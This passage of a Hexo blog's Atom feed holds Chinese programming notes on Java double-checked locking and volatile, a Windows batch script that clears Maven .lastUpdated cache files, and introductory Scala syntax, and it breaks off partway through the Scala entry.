<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mars</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-09T08:09:11.012Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Fly Hugh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>朝花夕拾</title>
    <link href="http://yoursite.com/2020/04/09/%E6%9C%9D%E8%8A%B1%E5%A4%95%E6%8B%BE/"/>
    <id>http://yoursite.com/2020/04/09/朝花夕拾/</id>
    <published>2020-04-09T07:29:23.635Z</published>
    <updated>2020-04-09T08:09:11.012Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>资质低下 三心二意 昨日知识 朝花夕拾</p></blockquote><a id="more"></a> <h3 id="更友好的创建对象方式"><a href="#更友好的创建对象方式" class="headerlink" title="更友好的创建对象方式"></a>更友好的创建对象方式</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1gdnjra9kkrj20sk0c6myf.jpg" alt="3d5024b55687373af54fcb9ef4e0eb4.png"></p><p>上面的方式，对JVM来说是更友好的，因为堆内存的调用无法避免，所以从栈内存这边入手解决内存问题是一个不错的解决的方式</p><hr><h3 id="下面代码是否线程安全"><a href="#下面代码是否线程安全" class="headerlink" title="下面代码是否线程安全"></a>下面代码是否线程安全</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> Singleton instance; </span><br><span class="line">    <span class="function"><span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> instance; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍一看类似饿汉式的单例，线程安全，其实是有问题的</p><p>虽然只有一个线程能够获得锁，并且这个锁还是类锁，所有对象共享的</p><p>关键在于 jvm 对 new 的优化，这个变量没有声明 volatile，new 不是一个线程安全的操作，</p><p>对于 new 这个指令，一般的顺序是申请内存空间，初始化内存空间，然后把内存地址赋给 instance 对象，但是 jvm 会对这段指令进行优化，优化之后变成 申请内存空间，内存地址赋给 instance 对象，初始化内存空间，这就导致 第二层检查可能会出错，标准写法只需要在变量前声明 volatile 即可。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1gdnkbsp9sij20pp0gy75i.jpg" alt="677701574e4f69f35e226ed6bc9a380.png"></p><hr><h3 id="volatile利用了什么协议来实现可见性"><a href="#volatile利用了什么协议来实现可见性" class="headerlink" title="volatile利用了什么协议来实现可见性"></a>volatile利用了什么协议来实现可见性</h3><p>volatile 是通过内存屏障实现的，MESI协议，缓存一致性协议</p><p>JVM推荐书《The Java Language Specification》<br>volatile 修饰的变量如果值发生变化 发现线程的高速缓存与主存数据不一致时候 由于缓存一致性协议 则总线将高速缓存中的值清空 其他线程只能通过访问主存来获取最新的值 并缓存到告诉缓存上。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;资质低下 三心二意 昨日知识 朝花夕拾&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JVM" scheme="http://yoursite.com/categories/JVM/"/>
    
      <category term="PICKS" scheme="http://yoursite.com/categories/JVM/PICKS/"/>
    
    
      <category term="PICKS" scheme="http://yoursite.com/tags/PICKS/"/>
    
  </entry>
  
  <entry>
    <title>clearLastUpdated</title>
    <link href="http://yoursite.com/2020/03/17/clearLastUpdated/"/>
    <id>http://yoursite.com/2020/03/17/clearLastUpdated/</id>
    <published>2020-03-17T02:46:49.404Z</published>
    <updated>2020-03-17T02:49:51.177Z</updated>
    
    <content type="html"><![CDATA[<p>mvn库 windows清理脚本<br>需要把mvn的位置改成自己的<br><a id="more"></a><br>cls<br>@ECHO OFF<br>SET CLEAR_PATH=C:<br>SET CLEAR_DIR=C:\Users\Administrator.m2\repository<br>color 0a<br>TITLE ClearLastUpdated For Windows<br>GOTO MENU<br>:MENU<br>CLS<br>ECHO.<br>ECHO. <em> </em> <em> </em>  ClearLastUpdated For Windows  <em> </em> <em> </em><br>ECHO. <em> </em><br>ECHO. <em> 1 清理</em>.lastUpdated <em><br>ECHO. </em> <em><br>ECHO. </em> 2 查看<em>.lastUpdated </em><br>ECHO. <em> </em><br>ECHO. <em> 3 退 出 </em><br>ECHO. <em> </em><br>ECHO. <em> </em> <em> </em> <em> </em> <em> </em> <em> </em> <em> </em> <em> </em> <em> </em> <em> </em> <em> </em> <em> </em> <em> </em><br>ECHO.<br>ECHO.请输入选择项目的序号：<br>set /p ID=<br>IF “%id%”==”1” GOTO cmd1<br>IF “%id%”==”2” GOTO cmd2<br>IF “%id%”==”3” EXIT<br>PAUSE<br>:cmd1<br>ECHO. 开始清理<br>%CLEAR_PATH%<br>cd %CLEAR_DIR%<br>for /r %%i in (<em>.lastUpdated) do del %%i<br>ECHO.OK<br>PAUSE<br>GOTO MENU<br>:cmd2<br>ECHO. 查看</em>.lastUpdated文件<br>%CLEAR_PATH%<br>cd %CLEAR_DIR%<br>for /r %%i in (*.lastUpdated) do echo %%i<br>ECHO.OK<br>PAUSE<br>GOTO MENU </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mvn库 windows清理脚本&lt;br&gt;需要把mvn的位置改成自己的&lt;br&gt;
    
    </summary>
    
      <category term="clearLastUpdated" scheme="http://yoursite.com/categories/clearLastUpdated/"/>
    
    
      <category term="windows bat" scheme="http://yoursite.com/tags/windows-bat/"/>
    
  </entry>
  
  <entry>
    <title>Scala Note</title>
    <link href="http://yoursite.com/2020/03/09/Scala%20Note/"/>
    <id>http://yoursite.com/2020/03/09/Scala Note/</id>
    <published>2020-03-09T10:03:41.710Z</published>
    <updated>2019-08-16T08:06:13.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>开一个新坑，Scala这门语言在优化上有很大的操作余地，需要相当的熟练度。本文仅做基础笔记的整理。</p></blockquote><a id="more"></a> <h1 id="Scala"><a href="#Scala" class="headerlink" title="Scala"></a>Scala</h1><h2 id="Scala-介绍"><a href="#Scala-介绍" class="headerlink" title="Scala 介绍"></a>Scala 介绍</h2><p>Scala 是 Scalable Language 的简写，是一门多范式的编程语言</p><p>联邦理工学院洛桑（EPFL）的Martin Odersky于2001年基于Funnel的工作开始设计Scala。</p><p>Funnel是把函数式编程思想和Petri网相结合的一种编程语言。</p><p>Odersky先前的工作是Generic Java和javac（Sun Java编译器）。Java平台的Scala于2003年底/2004年初发布。.NET平台的Scala发布于2004年6月。该语言第二个版本，v2.0，发布于2006年3月。</p><p>截至2009年9月，最新版本是版本2.7.6 。Scala 2.8预计的特性包括重写的Scala类库（Scala collections library）、方法的命名参数和默认参数、包对象（package object），以及Continuation。</p><p>2009年4月，Twitter宣布他们已经把大部分后端程序从Ruby迁移到Scala，其余部分也打算要迁移。此外， Wattzon已经公开宣称，其整个平台都已经是基于Scala基础设施编写的。</p><hr><h2 id="环境部分："><a href="#环境部分：" class="headerlink" title="环境部分："></a>环境部分：</h2><p>安装：和Java一样也要配置环境变量</p><p>配置IDEA：</p><p>先安装插件Scala</p><p>然后创建Maven项目</p><p>因为Maven默认不支持Scala</p><p>创建完毕之后</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3izm7uublj20f30ch0t5.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3izmsgpxxj20pw0lnab5.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3iznzcv6ej20sw0o13zt.jpg" alt></p><p>Scala文件夹标记为Source</p><h2 id="语法部分"><a href="#语法部分" class="headerlink" title="语法部分"></a>语法部分</h2><h3 id="Hello-Scala"><a href="#Hello-Scala" class="headerlink" title="Hello Scala"></a>Hello Scala</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">HelloScala</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"hello Scala"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命令台执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scala -cp C:\Users\61661\Desktop\scala-1.0-SNAPSHOT.jar HelloScala</span><br></pre></td></tr></table></figure><h3 id="声明值和变量"><a href="#声明值和变量" class="headerlink" title="声明值和变量"></a>声明值和变量</h3><p>Scala声明变量有两种方式：<code>val</code> 和 <code>var</code></p><p><code>val</code>定义的值是不可变的，它不是一个常量，是不可变量，或者称之为只读变量。</p><p>Tips：</p><ol><li>Scala的匿名变量（为了运行程序，系统自动添加的变量）分配<code>val</code>。</li><li><code>val</code>定义的变量虽然不能改变其引用的内存地址，但是可以改变其引用的对象的内部的其他属性值。</li><li>为了减少可变性引起的bug，应该尽可能地使用不可变变量。变量类型可以省略，解析器会根据值进行推断。<code>val</code>和<code>var</code>声明变量时都必须初始化。</li></ol><h3 id="常用类型"><a href="#常用类型" class="headerlink" title="常用类型"></a>常用类型</h3><p>8种常用类型</p><table><thead><tr><th>类型</th><th>属性</th></tr></thead><tbody><tr><td>Boolean</td><td><code>true</code> 或者 <code>false</code></td></tr><tr><td>Byte</td><td>8位， 有符号</td></tr><tr><td>Short</td><td>16位， 有符号</td></tr><tr><td>Int</td><td>32位， 有符号</td></tr><tr><td>Long</td><td>64位， 有符号</td></tr><tr><td>Char</td><td>16位， 无符号</td></tr><tr><td>Float</td><td>32位， 单精度浮点数</td></tr><tr><td>Double</td><td>64位， 双精度浮点数</td></tr><tr><td>String</td><td>由Char数组组成</td></tr></tbody></table><p>与Java中的数据类型不同，Scala并不区分基本类型和引用类型，所以这些类型<strong>都是对象</strong></p><p>可以调用相对应的方法，String直接使用的是<code>java.lang.String</code></p><p>由于String实际是一系列Char的不可变的集合，Scala中大部分针对集合的操作，都可以用于String，具体来说，String的这些方法存在于类<code>scala.collection.immutable.StringOps</code>中。</p><p>由于String在需要时能隐式转换为<code>StringOps</code>，因此不需要任何额外的转换，String就可以使用这些方法。</p><p>每一种数据类型都有对应的<code>Rich*</code>类型，如<code>RichInt</code>、<code>RichChar</code>等，为基本类型提供了更多的有用操作。</p><h3 id="常用类型结构图"><a href="#常用类型结构图" class="headerlink" title="常用类型结构图"></a>常用类型结构图</h3><p>Scala中，所有的值都是类对象，而所有的类，包括值类型，都最终继承自一个统一的根类型<code>Any</code>。统一类型，是Scala的又一大特点。更特别的是，Scala中还定义了几个底层类<code>Bottom Class</code>，比如<code>Null</code>和<code>Nothing</code>。</p><ol><li><code>Null</code>是所有引用类型的子类型，而<code>Nothing</code>是所有类型的子类型。<code>Null</code>类只有一个实例对象，<code>null</code>，类似于Java中的<code>null</code>引用。<code>null</code>可以赋值给任意引用类型，但是不能赋值给值类型。</li><li><code>Nothing</code>，可以作为没有正常返回值的方法的返回类型，非常直观的告诉你这个方法不会正常返回，而且由于<code>Nothing</code>是其他任意类型的子类，他还能跟要求返回值的方法兼容。</li><li><code>Unit</code>类型用来标识过程，也就是没有明确返回值的函数。 由此可见，<code>Unit</code>类似于<code>Java</code>里的<code>void</code>。<code>Unit</code>只有一个实例，()，这个实例也没有实质的意义。</li></ol><p>关系图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3jcuo85e8j20of0gtta1.jpg" alt></p><h3 id="算数操作符重载"><a href="#算数操作符重载" class="headerlink" title="算数操作符重载"></a>算数操作符重载</h3><p><code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>%</code>可以完成和Java中相同的工作，但是有一点区别，他们都是方法。你几乎可以用任何符号来为方法命名。</p><p><code>1 + 2</code> 等同于 <code>1.+(2)</code></p><p>Tips: Scala中没有++、–操作符，需要通过+=、-=来实现同样的效果。</p><h3 id="调用函数与方法"><a href="#调用函数与方法" class="headerlink" title="调用函数与方法"></a>调用函数与方法</h3><p>在Scala中，一般情况下我们不会刻意的去区分<code>函数</code>与<code>方法</code>的区别，但是他们确实是不同的东西。</p><p>后面我们再详细探讨。首先我们要学会使用Scala来调用函数与方法。</p><h4 id="1-调用函数，求方根"><a href="#1-调用函数，求方根" class="headerlink" title="1.调用函数，求方根"></a>1.调用函数，求方根</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.math</span><br><span class="line">sqrt(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><h4 id="2-调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）"><a href="#2-调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）" class="headerlink" title="2.调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）"></a>2.调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInt</span>.probablePrime(<span class="number">16</span>, scala.util.<span class="type">Random</span>)</span><br></pre></td></tr></table></figure><h4 id="3-调用方法，非静态方法，使用对象调用"><a href="#3-调用方法，非静态方法，使用对象调用" class="headerlink" title="3.调用方法，非静态方法，使用对象调用"></a>3.调用方法，非静态方法，使用对象调用</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"HelloWorld"</span>.distinct</span><br></pre></td></tr></table></figure><h4 id="4-apply与update方法"><a href="#4-apply与update方法" class="headerlink" title="4.apply与update方法"></a>4.apply与update方法</h4><p>apply方法是调用时可以省略方法名的方法。用于构造和获取元素：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Hello"</span>(<span class="number">4</span>)  等同于  <span class="string">"Hello"</span>.apply(<span class="number">4</span>)</span><br><span class="line"><span class="type">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) 等同于 <span class="type">Array</span>.apply(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">如：</span><br><span class="line">println(<span class="string">"Hello"</span>(<span class="number">4</span>))</span><br><span class="line">println(<span class="string">"Hello"</span>.apply(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>在<code>StringOps</code>中你会发现一个 <code>def apply(n: Int): Char</code>方法定义。<code>update</code>方法也是调用时可以省略方法名的方法，用于元素的更新：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr(<span class="number">4</span>) = <span class="number">5</span>  等同于  arr.update(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">如：</span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Int</span>](<span class="number">5</span>)</span><br><span class="line">arr1(<span class="number">1</span>) = <span class="number">2</span></span><br><span class="line">arr1.update(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">println(arr1.mkString(<span class="string">","</span>))</span><br></pre></td></tr></table></figure><h4 id="Option类型"><a href="#Option类型" class="headerlink" title="Option类型"></a>Option类型</h4><p>Scala为单个值提供了对象的包装器，表示为那种可能存在也可能不存在的值。他只有两个有效的子类对象，一个是Some，表示某个值，另外一个是None，表示为空，通过Option的使用，避免了使用null、空字符串等方式来表示缺少某个值的做法。</p><p>如：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> map1 = <span class="type">Map</span>(<span class="string">"Alice"</span> -&gt; <span class="number">20</span>, <span class="string">"Bob"</span> -&gt; <span class="number">30</span>)</span><br><span class="line">println(map1.get(<span class="string">"Alice"</span>))</span><br><span class="line">println(map1.get(<span class="string">"Jone"</span>))</span><br></pre></td></tr></table></figure><h3 id="控制结构和函数"><a href="#控制结构和函数" class="headerlink" title="控制结构和函数"></a>控制结构和函数</h3><h4 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h4><p>Scala中没有三目运算符，因为根本不需要。Scala中if else表达式是有返回值的，如果if或者else返回的类型不一样，就返回Any类型（所有类型的公共超类型）。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> a3 = <span class="number">10</span></span><br><span class="line">    <span class="keyword">val</span> a4 =</span><br><span class="line">      <span class="comment">//返回类型一样</span></span><br><span class="line">      <span class="keyword">if</span>(a3 &gt; <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="string">"a3大于20"</span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="string">"a3小于20"</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">val</span> a5 = </span><br><span class="line">      <span class="keyword">if</span>(a3 &gt; <span class="number">20</span>)&#123;</span><br><span class="line">          <span class="string">"a3大于20"</span></span><br><span class="line">      &#125;</span><br><span class="line">    println(a4)</span><br><span class="line">    <span class="comment">//a3小于20</span></span><br><span class="line">    println(a5)</span><br><span class="line">    <span class="comment">//()</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果缺少一个判断，什么都没有返回，但是Scala认为任何表达式都会有值，对于空值，使用Unit类，写做()，叫做无用占位符，相当于Java中的void。</p><p>Tips: 行尾的位置不需要分号，只要能够从上下文判断出语句的终止即可。但是如果在单行中写多个语句，则需要分号分割。在Scala中，{}块包含一系列表达式，其结果也是一个表达式。块中最后一个表达式的值就是块的值。</p><h4 id="while-表达式"><a href="#while-表达式" class="headerlink" title="while 表达式"></a>while 表达式</h4><p>Scala提供和Java一样的while和do循环，与If语句不同，While语句本身没有值，即整个While语句的结果是Unit类型的()。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">val</span> while1 = <span class="keyword">while</span>(n &lt;= <span class="number">10</span>)&#123;</span><br><span class="line">      n += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println(while1) <span class="comment">//()</span></span><br><span class="line">    println(n) <span class="comment">//11</span></span><br><span class="line">    <span class="comment">//Scala提供和Java一样的while和do循环，与If语句不同，While语句本身没有值，即整个While语句的结果是Unit类型的()。</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>while循环的中断</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.util.control.<span class="type">Breaks</span></span><br><span class="line"><span class="keyword">val</span> loop = <span class="keyword">new</span> <span class="type">Breaks</span></span><br><span class="line">loop.breakable&#123;</span><br><span class="line">  <span class="keyword">while</span>(n &lt;= <span class="number">20</span>)&#123;</span><br><span class="line">    n += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">18</span>)&#123;</span><br><span class="line">      loop.<span class="keyword">break</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">println(n)</span><br></pre></td></tr></table></figure><p>Tips: Scala并没有提供break和continue语句来退出循环，如果需要break，可以通过几种方法来做1、使用Boolean型的控制变量 2、使用嵌套函数，从函数中return 3、使用Breaks对象的break方法。</p><h4 id="for表达式"><a href="#for表达式" class="headerlink" title="for表达式"></a>for表达式</h4><p>Scala也为for循环这一常见的控制结构提供了非常多的特性，这些for循环特性被称为for推导式(for comprehension)或for表达式(for expression).</p><h5 id="for示例1-to左右两边为前闭后闭的访问"><a href="#for示例1-to左右两边为前闭后闭的访问" class="headerlink" title="for示例1: to左右两边为前闭后闭的访问"></a>for示例1: to左右两边为前闭后闭的访问</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span>; j &lt;- <span class="number">1</span> to <span class="number">3</span>)&#123;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例2：until左右两边为前闭后开的访问"><a href="#for示例2：until左右两边为前闭后开的访问" class="headerlink" title="for示例2：until左右两边为前闭后开的访问"></a>for示例2：until左右两边为前闭后开的访问</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> until <span class="number">3</span>; j &lt;- <span class="number">1</span> until <span class="number">3</span>) &#123;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例3：引入保护式（也称条件判断式）该语句只打印1-3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue"><a href="#for示例3：引入保护式（也称条件判断式）该语句只打印1-3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue" class="headerlink" title="for示例3：引入保护式（也称条件判断式）该语句只打印1 3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue"></a>for示例3：引入保护式（也称条件判断式）该语句只打印1 3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span> <span class="keyword">if</span> i != <span class="number">2</span>) &#123;</span><br><span class="line">  print(i + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例4：引入变量"><a href="#for示例4：引入变量" class="headerlink" title="for示例4：引入变量"></a>for示例4：引入变量</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span>; j = <span class="number">4</span> - i) &#123;</span><br><span class="line">  print(j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字"><a href="#for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字" class="headerlink" title="for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字"></a>for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> for5 = <span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">10</span>) <span class="keyword">yield</span> i</span><br><span class="line">println(for5)</span><br></pre></td></tr></table></figure><h5 id="for示例6：使用花括号-代替小括号"><a href="#for示例6：使用花括号-代替小括号" class="headerlink" title="for示例6：使用花括号{}代替小括号()"></a>for示例6：使用花括号{}代替小括号()</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">  i &lt;- <span class="number">1</span> to <span class="number">3</span></span><br><span class="line">  j = <span class="number">4</span> - i&#125;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><p><strong>Tips</strong>: {}和()对于for表达式来说都可以。for 推导式有一个不成文的约定：当for<br>推导式仅包含单一表达式时使用原括号，当其包含多个表达式时使用大括号。值得注意的是，使用原括号时，早前版本的Scala 要求表达式之间必须使用分号。</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>scala定义函数的标准格式为：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">函数名</span></span>(参数名<span class="number">1</span>: 参数类型<span class="number">1</span>, 参数名<span class="number">2</span>: 参数类型<span class="number">2</span>) : 返回类型 = &#123;函数体&#125;</span><br></pre></td></tr></table></figure><p>函数示例1：返回Unit类型的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">shout1</span><span class="params">(content: String)</span> : Unit </span>= &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例2：返回Unit类型的函数，但是没有显式指定返回类型。（当然也可以返回非Unit类型的值）</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout2</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例3:返回值类型有多种可能，此时也可以省略Unit</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout3</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  <span class="keyword">if</span>(content.length &gt;= <span class="number">3</span>)</span><br><span class="line">    content + <span class="string">"喵喵喵~"</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例4：带有默认值参数的函数，调用该函数时，可以只给无默认值的参数传递值，也可以都传递，新值会覆盖默认值；传递参数时如果不按照定义顺序，则可以通过参数名来指定。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout4</span></span>(content: <span class="type">String</span>, leg: <span class="type">Int</span> = <span class="number">4</span>) = &#123;</span><br><span class="line">  println(content + <span class="string">","</span> + leg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例5：变长参数（不确定个数参数，类似Java的…）</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 